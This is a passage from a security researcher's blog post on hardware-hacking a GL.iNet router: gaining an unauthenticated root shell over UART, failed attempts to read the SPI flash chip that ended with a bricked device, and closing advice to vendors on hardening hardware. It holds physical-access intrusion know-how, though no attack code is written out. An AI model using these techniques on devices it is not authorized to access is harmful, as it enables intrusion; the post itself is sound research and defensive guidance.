id="connecting-to-uart">Connecting to UART</h3><p>Let's quickly go over what's UART. UART is used to send and receive data from devices over a serial connection. This is done for purposes such as updating firmware manually, debugging, or interfacing with the underlying system (kind of like opening a new terminal in Ubuntu). UART works by communicating through two wires, a transmitter wire (TX) and a receiver wire (RX) to talk to the micro-controller or system on a chip (basically the brains of the device) directly.</p><p>The receiver and transmitter marked RX and TX respectively, need to connect to a second respective UART device’s TX and RX in order to establish a communication. I'm lucky enough to have received my <a href="https://flipperzero.one/?ref=boschko.ca">Flipper Zero</a> so I'll be using it for this!</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-80.png" class="kg-image" alt="" loading="lazy" width="512" height="256"></figure><p>If you would like more in-depth information on UART see my blog on <a href="https://boschko.ca/hardware_hacking_yo_male_fertility/">hacking a fertility sperm tester</a>. We'll connect our Flipper Zero to the router UART connection as seen below. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-39.png" class="kg-image" alt="" loading="lazy" width="878" height="384" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-39.png 600w, https://boschko.ca/content/images/2022/05/image-39.png 878w" sizes="(min-width: 720px) 720px"></figure><p>The result will be a little something like this. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-40.png" class="kg-image" alt="" loading="lazy" width="1484" height="1476" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-40.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-40.png 1000w, https://boschko.ca/content/images/2022/05/image-40.png 1484w" sizes="(min-width: 720px) 720px"></figure><p>Since I'm a Mac user connecting to my Flipper Zero via USB will "mount" or make the device accessible at <code>/dev/cu.usbmodemflip*</code> so if I want to connect to it all I need to do is run the command below. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-32.png" class="kg-image" alt="" loading="lazy" width="844" height="62" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-32.png 600w, https://boschko.ca/content/images/2022/05/image-32.png 844w" sizes="(min-width: 720px) 720px"></figure><p>Once I've ran the screen command, and the router is powered on, ill start seeing serial output confirming that I've properly connected to UART. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-34.png" class="kg-image" alt="" loading="lazy" width="1258" height="722" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-34.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-34.png 1000w, https://boschko.ca/content/images/2022/05/image-34.png 1258w" sizes="(min-width: 720px) 720px"></figure><p>As you can see, I've obtained a root shell. Unprotected root access via the UART is technically a vulnerability <a href="https://vuldb.com/?vulnerability_cwe.200702=&ref=boschko.ca">CWE-306</a>. Connecting to the UART port drops you directly to a root shell, and exposes an unauthenticated Das U-Boot BIOS shell. This isn't something you see too often, UART is commonly tied down. However, "exploitation" requires physical access, the device needs to be opened, and wires connecting to pads RX, TX, and GND on the main logic board. GL.iNET knows about this, and to my knowledge doesn't plan on patching it. This is understandable as there's no "real" impact. </p><p>I'll go on a <em>"quick"</em> rant about why unprotected UART CVEs are silly. The attack requires physical access to the device. So, an attacker has to be on-site, most likely inside a locked room where networking equipment is located, and is probably monitored by CCTV... The attacker must also attach an additional USB-to-UART component to the device's PCB in order to gain console access. Since physically dismantling the device is required to fulfill the attack, I genuinely don't consider this oversight from the manufacturer a serious vulnerability. Obviously, it's not great, but realistically these types of things are at the vendor's discretion. Moreover, even when protections are in place to disable the UART console and/or have the wide debug pads removed from the PCB there are many tricks one can use to navigate around those mechanisms.</p><p>Although personally, I believe it's simply best practice for a hardware manufacturer to disable hardware debugging interfaces in the final product of any commercial device. Not doing so isn't worthy of a CVE.</p><p>Getting back on track. Hypothetically if we were in a situation where we couldn't get access to a shell from UART we'd likely be able to get one from U-Boot. There are actually a lot of different ways to get an application shell from here. Two of those techniques were covered in my blog <a href="https://boschko.ca/hardware_hacking_yo_male_fertility/">Thanks Fo' Nut'in - Hacking YO's Male Fertility Sperm Test</a> so I won't be covering them here.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-41.png" class="kg-image" alt="" loading="lazy" width="996" height="1226" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-41.png 600w, https://boschko.ca/content/images/2022/05/image-41.png 996w" sizes="(min-width: 720px) 720px"></figure><h3 id="leveraging-the-spi-flash">Leveraging the SPI Flash</h3><p>Even though the serial console is enabled, if it weren't, and we had no success getting a shell from U-Boot, our next avenue of attack might be to extract the firmware from the SPI flash chip. </p><p>The goal is simple, read the firmware from the chip. There are a few options like using clips universal bus interface device, unsoldering the chip from the board and connecting it to a specialized EPROM read/write device or attaching it to a Protoboard. I like the first option and using SOIC8 clips over hook clips.</p><p>At a minimum, we'll need a hardware tool that can interact with at least an SPI interface. I'm a big fan of the <a href="https://www.attify-store.com/products/attify-badge-uart-jtag-spi-i2c?ref=boschko.ca">Attify Badge</a> as it’s very efficient and supports many interfaces like SPI, UART, JTAG, I2C, GPIO, and others. But you could other devices like a professional EPROM programmer, a Bus Pirate, beaglebone<strong>, </strong>Raspberry Pi, etc,.</p><p>Below is the pinout found on the <a href="https://datasheet.octopart.com/MX25L12835FZ2I-10G-Macronix-datasheet-14372549.pdf?ref=boschko.ca">datasheet</a> for our Macronix MX25L12835F flash.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-42.png" class="kg-image" alt="" loading="lazy" width="1476" height="968" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-42.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-42.png 1000w, https://boschko.ca/content/images/2022/05/image-42.png 1476w" sizes="(min-width: 720px) 720px"></figure><p>All you need to do is make the proper connections from the chip to the Attify badge. I've made mine according to the diagram below.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-43.png" class="kg-image" alt="" loading="lazy" width="558" height="412"></figure><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-81.png" class="kg-image" alt="" loading="lazy" width="1588" height="1586" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-81.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-81.png 1000w, https://boschko.ca/content/images/2022/05/image-81.png 1588w" sizes="(min-width: 720px) 720px"></figure><p>OK. I spent a solid two nights trying to dump the firmware without success. I've tried the Bus Pirate, Shikra, Attify, and a beaglebone black but nothing seems to work. Flashrom appears to be unable to read the data or even identify the chip, which is really weird. I've confirmed the pinouts are correct from the datasheet, and as seen below, flashrom supports this chip.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-75.png" class="kg-image" alt="" loading="lazy" width="834" height="315" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-75.png 600w, https://boschko.ca/content/images/2022/05/image-75.png 834w" sizes="(min-width: 720px) 720px"></figure><p>Attempting to dump the firmware results in the following.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-74.png" class="kg-image" alt="" loading="lazy" width="1360" height="660" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-74.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-74.png 1000w, https://boschko.ca/content/images/2022/05/image-74.png 1360w" sizes="(min-width: 720px) 720px"></figure><p>So what's going on? I'm not an EE so I had to do <strong><u>a lot</u></strong> of reading &amp; talking to extremely patient people. Ultimately, I suspect this is happening because there is already a contention for the SPI bus (the MediaTek MT7628NN chip), and due to the nature of what we're attempting to do, the router is receiving two masters connections and ours is not taking precedence. Currently, the MCU on the board is the master of the SPI chip, that's the one where all the communication is going to and from. I wasn't able to find a way to intercept, short, or stop that communication to make our Attify badge the master. In theory, a trick to get around this would be by holding down a reset button while reading the flash and just hoping to get lucky (I did this for ~2h and had no luck). Since our Attify badge would already be powered on, it could "IN THEORY" take precedence. This could, again "in theory" stop the chip from mastering to the MCU. But I haven't been able to do so properly. I've spent ~8 hours on this, tying out multiple different hardware (PI, beaglebone, Attify, BusPirate) without success. I also suspect that being on a MacBook Pro with funky USB adapters could be making my situation worse. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-76.png" class="kg-image" alt="" loading="lazy" width="544" height="403"></figure><p>Okay, we're left with no other option than to go "off-chip". As previously mentioned, there are multiple ways to dump the contents of flash memory. Let's try desoldering the component from the board, and use a chip reprogrammer to read off the contents. </p><p>My setup is extremely cheap setup is very sub-optimal. I don't own a fixed "hot air station" or PDC mount. I'm just using a loose heat gun.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/09/image-163.png" class="kg-image" alt="" loading="lazy" width="989" height="855" srcset="https://boschko.ca/content/images/size/w600/2022/09/image-163.png 600w, https://boschko.ca/content/images/2022/09/image-163.png 989w" sizes="(min-width: 720px) 720px"></figure><p>Our goal is to apply enough heat so that the solder joints melt. We need to extracted the chip with tweezers without damaging components. Easier said then done with  my shitty station. differential heating on the board can be an issue. When a jet of hot air is applied to a PCB at room temperature, most of the heat is diffused to the colder spots, making the heating of the region of interest poor. To work around this you might think that increasing the heat will solve all of our issues. However, simply increasing the temperature is dangerous and not advisable. </p><p>When a component is put under increased thermal stress the temperature gradient increases along the board. The temperature difference on the board will produce thermal expansion in different areas, producing mechanical stress that may damage the board, break, and shift components. Not good. My setup is prone to this type of error because I don't have a mounting jig for the heat gun that can control distance. I don't have any high-temperature tape I can apply to the surrounding components so that they don't get affected by my shaky hand controlling the heat source.</p><p>Regardless, for most small components, a preheating temperature of 250º C should be enough.</p><p>After a few minutes, I was able to get the chip off. However, there is a tiny shielded inductor or resistor that was affected by the heat which shifted when I removed the SPI with the tweezers. I wasn't able to get this component back on the board. <em>Fuck</em>. I'm not an EE so I don't <em>fully</em> understand the impact and consequences this has.  </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/09/image-166.png" class="kg-image" alt="" loading="lazy" width="1727" height="667" srcset="https://boschko.ca/content/images/size/w600/2022/09/image-166.png 600w, https://boschko.ca/content/images/size/w1000/2022/09/image-166.png 1000w, https://boschko.ca/content/images/size/w1600/2022/09/image-166.png 1600w, https://boschko.ca/content/images/2022/09/image-166.png 1727w" sizes="(min-width: 720px) 720px"></figure><p>Let's mount the SPI onto a SOP8 socket which we'll then connect to our reprogrammer. Below is the orientation of the memory in the adapter. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/09/image-167.png" class="kg-image" alt="" loading="lazy" width="869" height="691" srcset="https://boschko.ca/content/images/size/w600/2022/09/image-167.png 600w, https://boschko.ca/content/images/2022/09/image-167.png 869w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/09/image-168.png" class="kg-image" alt="" loading="lazy" width="835" height="648" srcset="https://boschko.ca/content/images/size/w600/2022/09/image-168.png 600w, https://boschko.ca/content/images/2022/09/image-168.png 835w" sizes="(min-width: 720px) 720px"></figure><p>This is, once again, quite a shitty reprogrammer. I actually had to disable driver signing to get the USB connection recognized after manually installing the shady driver. We'll go ahead and configure our chip options knowing our SPI is Macronix MX25L12835F. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/09/image-169.png" class="kg-image" alt="" loading="lazy" width="1196" height="765" srcset="https://boschko.ca/content/images/size/w600/2022/09/image-169.png 600w, https://boschko.ca/content/images/size/w1000/2022/09/image-169.png 1000w, https://boschko.ca/content/images/2022/09/image-169.png 1196w" sizes="(min-width: 720px) 720px"></figure><p>However, this also failed/couldn't do any reads. I spend another ~5 hours debugging this. I thought it was the SOP socket clip so I soldered it onto a board and relayed the links to the reprogrammer but the results were the same.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/09/image-170.png" class="kg-image" alt="" loading="lazy" width="311" height="253"></figure><p>After a while, I went ahead and re-soldered it to the main router PCB, and the device was fully bricked. To be quite honest, I'm not sure what I did wrong/at which step I made the mistake. </p><p>They say that failure is another stepping stone to greatness, but given that the entire reason for this purchase was to try out some new hardware hacking methodologies.... this was very bittersweet. </p><p>I remembered the squashfs information displayed in the UART log information. So, if we really wanted to reverse the firmware it's still impossible. You can grab the unsigned firmware from the vendor's site vendors <a href="https://dl.gl-inet.com/?ref=boschko.ca">here</a>. Below are the steps you'd follow if you had successfully extracted the firmware to get to the filesystem.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-160.png" class="kg-image" alt="" loading="lazy" width="2000" height="331" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-160.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-160.png 1000w, https://boschko.ca/content/images/size/w1600/2022/05/image-160.png 1600w, https://boschko.ca/content/images/size/w2400/2022/05/image-160.png 2400w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-161.png" class="kg-image" alt="" loading="lazy" width="1460" height="488" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-161.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-161.png 1000w, https://boschko.ca/content/images/2022/05/image-161.png 1460w" sizes="(min-width: 720px) 720px"></figure><p>So let's check if they have any hardcoded credentials.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/05/image-162.png" class="kg-image" alt="" loading="lazy" width="1662" height="516" srcset="https://boschko.ca/content/images/size/w600/2022/05/image-162.png 600w, https://boschko.ca/content/images/size/w1000/2022/05/image-162.png 1000w, https://boschko.ca/content/images/size/w1600/2022/05/image-162.png 1600w, https://boschko.ca/content/images/2022/05/image-162.png 1662w" sizes="(min-width: 720px) 720px"></figure><p>Luckily, they don't.</p><p>The last thing I observed was that in the UBI reader there is an extra data block at the end of the image and somewhere in between that in theory could allow us to read code.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/06/image-91.png" class="kg-image" alt="" loading="lazy" width="1302" height="722" srcset="https://boschko.ca/content/images/size/w600/2022/06/image-91.png 600w, https://boschko.ca/content/images/size/w1000/2022/06/image-91.png 1000w, https://boschko.ca/content/images/2022/06/image-91.png 1302w" sizes="(min-width: 720px) 720px"></figure><hr><p>This purchase was supposed to be hardware hacking focused &amp; I failed my personal objectives. To compensate I'll share some closing thoughts with you. </p><p>In case you were wondering "how can the vendor prevent basic IoT hardware vulnerabilities? And is it worth it?". The answer is yes, and yes. This blog is long enough so I'll keep it short. </p><p>Think of it this way. Having an extra layer of protection or some baseline obfuscation in the event that developers make mistakes is a good idea and something that should be planned for. The way I see it, if the JTAG, UART, or ICSP connector weren't immediately apparent, this would've slowed me down and perhaps eventually demotivate me to push on. </p><p>The beautiful part is that hardware obfuscation is easy to introduce at the earliest stages of product development. Unlike software controls, which are implemented at later stages of the project and left out due to lack of time. There exist many different hardware controls which are all relatively easy to implement. </p><p>Since the hardware hacking portion of this blog wasn't a great success I might as well share some thoughts &amp; ideas on remediation &amp; how to make IoT hardware more secure. </p><p>1. Removing the PCB silkscreen. Marks, logos, symbols, etc, have to go. There's no real reason to draw up the entire board, especially if it's in production.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/06/image-108.png" class="kg-image" alt="" loading="lazy" width="316" height="184"></figure><p>2. Hide the traces! It's too simple to follow the solder mask (the light green parts on this PCB) What's the point of making them so obvious?</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/06/image-114.png" class="kg-image" alt="" loading="lazy" width="786" height="670" srcset="https://boschko.ca/content/images/size/w600/2022/06/image-114.png 600w, https://boschko.ca/content/images/2022/06/image-114.png 786w" sizes="(min-width: 720px) 720px"></figure><p>3. Hardware-level tamper protection. It's possible to set hardware and even software fuses to prevent readout (bear in mind that both can be bypassed in many cases).</p><p>4. Remove test pins and probe pads and other debugging connections. Realistically speaking if the product malfunctions and a firmware update won’t fix it, the manufacturer likely won't send someone onsite to debug /fix it. 99% of the time they're simply going to send you a new one. So why have debug interfaces enabled/on production devices?</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/06/image-110.png" class="kg-image" alt="" loading="lazy" width="766" height="477" srcset="https://boschko.ca/content/images/size/w600/2022/06/image-110.png 600w, https://boschko.ca/content/images/2022/06/image-110.png 766w" sizes="(min-width: 720px) 720px"></figure><p>5. If you're using vias as test points (because they make using a multimeter or a scope probe much easier, and are typically used by embedded passive components) it would be wise to use buried or blind vias. The cost of adding additional PCB layers is cheap if you don't already have enough to do this. </p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/08/image-144.png" class="kg-image" alt="" loading="lazy" width="740" height="370" srcset="https://boschko.ca/content/images/size/w600/2022/08/image-144.png 600w, https://boschko.ca/content/images/2022/08/image-144.png 740w" sizes="(min-width: 720px) 720px"></figure><p>6. Remove all chipset markings! It’s <u>seriously</u> so much harder &amp; time-consuming to identify a chip with no markings.</p><figure class="kg-card kg-image-card"><img src="https://boschko.ca/content/images/2022/06/image-111.png" class="kg-image" alt="" loading="lazy" width="264" height="266"></figure><p>7. Why not use tamper-proof cases, sensors (photodiode detectors), or one-way screws. Again some of these are not difficult to drill bypass. However, you're testing the motivation of the attacker. Only really motivated reverse engineers would bother opening devices in the dark.</p><p>If you're interested, here are some solid publications regarding hardware obfuscation I'd recommend the following papers:</p><pre><code>1. https://arxiv.org/pdf/1910.00981.pdf
2. https://swarup.ece.ufl.edu/papers/J/J48.pdf
</code></pre><h2 id="summary"><strong>Summary:</strong></h2><p>I hope you liked the blog post. Follow me on <a href="https://twitter.com/olivier_boschko?ref=boschko.ca">twitter</a> I sometimes post interesting stuff there too. This was a lot of fun! Personally, I'd strongly recommend going on Amazon, Alibaba, or Aliexpress and buying a bunch of odd or common IoT devices and tearing them down. You never know what you will find :)</p><p><strong>Thank you for reading!</strong></p>
    </section>


</article>
</main>

    <section class="footer-cta outer">
        <div class="inner">
            <h2 class="footer-cta-title">Sign up for more like this.</h2>
            <a class="footer-cta-button" href="#/portal" data-portal>
                <div class="footer-cta-input">Enter your email</div>
                <span>Subscribe</span>
            </a>
        </div>
    </section>



            <aside class="read-more-wrap outer">
                <div class="read-more inner">
                        
<article class="post-card post no-image keep-ratio">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/adversarial-ml/">
            <header class="post-card-header">
                <div class="post-card-tags">
                </div>
                <h2 class="post-card-title">
                    Breaking Down Adversarial Machine Learning Attacks Through Red Team Challenges
                </h2>
            </header>
                <div class="post-card-excerpt">Learn how to craft and understand adversarial attacks on AI/ML models through hands-on challenges on Dreadnode’s Crucible CTF platform.</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2024-11-27">27 Nov 2024</time>
                <span class="post-card-meta-length">25 min read</span>
        </footer>

    </div>

</article>
                        
<article class="post-card post no-image keep-ratio">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/incinerator/">
            <header class="post-card-header">
                <div class="post-card-tags">
                </div>
                <h2 class="post-card-title">
                    Incinerator: The Ultimate Android Malware Reversing Tool
                </h2>
            </header>
                <div class="post-card-excerpt">Master Android malware reversal with ease using Incinerator, your trusted ally in the fight against threat actors for experts and novices alike.</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2024-04-03">03 Apr 2024</time>
                <span class="post-card-meta-length">15 min read</span>
        </footer>

    </div>

</article>
                        
<article class="post-card post no-image keep-ratio">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/tp-link-tddp-bof/">
            <header class="post-card-header">
                <div class="post-card-tags">
                </div>
                <h2 class="post-card-title">
                    TP-Link TDDP Buffer Overflow Vulnerability
                </h2>
            </header>
                <div class="post-card-excerpt">TP-Link&#39;s TDDP programs listening on UDP port 1040, fails to properly verify data length during parsing, leading to memory overflow destroying the memory structure and causing a denial of service.</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2024-03-19">19 Mar 2024</time>
                <span class="post-card-meta-length">8 min read</span>
        </footer>

    </div>

</article>
                </div>
            </aside>



    </div>

    <footer class="site-footer outer">
        <div class="inner">
            <section class="copyright"><a href="https://boschko.ca">Boschko Security Blog</a> &copy; 2025</section>
            <nav class="site-footer-nav">
                
            </nav>
            <div class="gh-powered-by"><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
        </div>
    </footer>

</div>

    <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="pswp__bg"></div>

    <div class="pswp__scroll-wrap">
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>
<script
    src="https://code.jquery.com/jquery-3.5.1.min.js"
    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
    crossorigin="anonymous">
</script>
<script src="https://boschko.ca/assets/built/casper.js?v=4f517c742f"></script>
<script>
$(document).ready(function () {
    // Mobile Menu Trigger
    $('.gh-burger').click(function () {
        $('body').toggleClass('gh-head-open');
    });
    // FitVids - Makes video embeds responsive
    $(".gh-content").fitVids();
});
</script>



</body>
</html>
